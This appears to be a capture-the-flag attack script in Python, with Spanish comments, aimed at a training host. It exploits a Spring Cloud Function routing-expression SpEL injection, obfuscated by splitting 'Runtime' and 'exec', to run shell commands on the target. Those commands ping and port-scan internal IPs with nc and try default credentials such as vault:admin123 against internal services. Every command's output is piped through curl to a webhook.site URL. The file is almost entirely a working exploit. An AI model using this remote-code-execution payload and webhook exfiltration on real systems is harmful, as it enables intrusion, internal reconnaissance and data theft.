#!/usr/bin/env python3
"""
CTF Chile - Decodificador de datos vault hexadecimales
"""
import requests
import time
import struct
import socket

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🔍 DECODIFICANDO DATOS VAULT")
print("=" * 50)

# Valores hex encontrados
hex_values = [
    "0x11000040",
    "0x10000000",
    "0x10000040",
    "0x10000040",
    "0x1003",
    "0x80",
    "0x9",
    "0x1003"
]

print("Valores hex encontrados:")
for hex_val in hex_values:
    decimal = int(hex_val, 16)
    print(f"{hex_val} = {decimal}")

    # Intentar como IP (big endian y little endian)
    try:
        ip_bytes = struct.pack('>I', decimal)
        ip_addr = socket.inet_ntoa(ip_bytes)
        print(f"  Como IP (big endian): {ip_addr}")
    except:
        pass

    try:
        ip_bytes = struct.pack('<I', decimal)
        ip_addr = socket.inet_ntoa(ip_bytes)
        print(f"  Como IP (little endian): {ip_addr}")
    except:
        pass

    # Como puerto
    if decimal <= 65535:
        print(f"  Como puerto: {decimal}")

    # Como ASCII si es imprimible
    try:
        ascii_str = ""
        temp = decimal
        while temp > 0:
            char = chr(temp & 0xFF)
            if 32 <= ord(char) <= 126:
                ascii_str = char + ascii_str
            temp >>= 8
        if ascii_str:
            print(f"  Como ASCII: '{ascii_str}'")
    except:
        pass

    print()

# Crear webhook para más exploración
r = requests.post("https://webhook.site/token", timeout=10)
UUID = r.json()["uuid"]
WH = f"https://webhook.site/{UUID}"
print(f"Webhook: https://webhook.site/#!/{UUID}")

def execute_rce(cmd, desc=""):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        if desc:
            print(f"    ✓ {desc}")
        return True
    except:
        if desc:
            print(f"    ✗ {desc}")
        return False

print("\n[1/3] Explorando IPs candidatas...")

# IPs candidatas basadas en decodificación
candidate_ips = ["17.0.0.64", "16.0.0.0", "64.0.0.17"]

for ip in candidate_ips:
    # Ping a las IPs
    cmd = f"ping -c 1 {ip} 2>&1"
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/ping_{ip.replace('.', '_')}"
    execute_rce(full_cmd, f"Ping a {ip}")

    # Escanear puertos comunes
    for port in [22, 80, 8080, 443]:
        cmd = f"nc -w 3 {ip} {port} 2>&1"
        full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/scan_{ip.replace('.', '_')}_{port}"
        execute_rce(full_cmd, f"Escanear {ip}:{port}")
        time.sleep(0.5)

print("\n[2/3] Usando credenciales vault en servicios específicos...")

# Probar vault:admin123 en servicios específicos
vault_services = [
    "curl -s -u vault:admin123 http://10.160.209.1:8080/api/vault",
    "curl -s -u vault:admin123 http://10.160.209.1:8080/admin",
    "curl -s -X POST -d 'username=vault&password=admin123' http://10.160.209.1:8080/api/login",
    "curl -s -H 'Authorization: Basic $(echo -n vault:admin123 | base64)' http://10.160.209.1:8080/api/secrets",
]

for i, service_cmd in enumerate(vault_services):
    full_cmd = f"({service_cmd}) | curl -s -X POST --data-binary @- {WH}/vault_service_{i}"
    execute_rce(full_cmd, f"Servicio vault {i+1}")
    time.sleep(1)

print("\n[3/3] Explorando funcionalidad vault avanzada...")

# Comandos específicos de vault/admin
advanced_commands = [
    "curl -s http://10.160.209.1:8080/api/vault/status?token=admin123",
    "curl -s http://10.160.209.1:8080/api/admin/users?session=vault",
    "curl -s -X POST http://10.160.209.1:8080/api/vault/unlock -d 'key=admin123'",
    "curl -s http://10.160.209.1:8080/vault.php?action=list&auth=admin123",
    "ftp vault@10.160.209.1 <<< 'admin123\nls\nquit'",
]

for i, cmd in enumerate(advanced_commands):
    full_cmd = f"({cmd}) | curl -s -X POST --data-binary @- {WH}/advanced_{i}"
    execute_rce(full_cmd, f"Comando avanzado {i+1}")
    time.sleep(1)

print("\n⏳ Esperando resultados (15s)...")
time.sleep(15)

print(f"\n🔗 Revisa resultados: https://webhook.site/#!/{UUID}")
print("\n🎯 BUSCAR:")
print("• Respuestas exitosas de servicios vault")
print("• Nuevas IPs o puertos accesibles")
print("• Mensajes de autenticación exitosa")
print("• Datos o flags en respuestas")
print("="*50)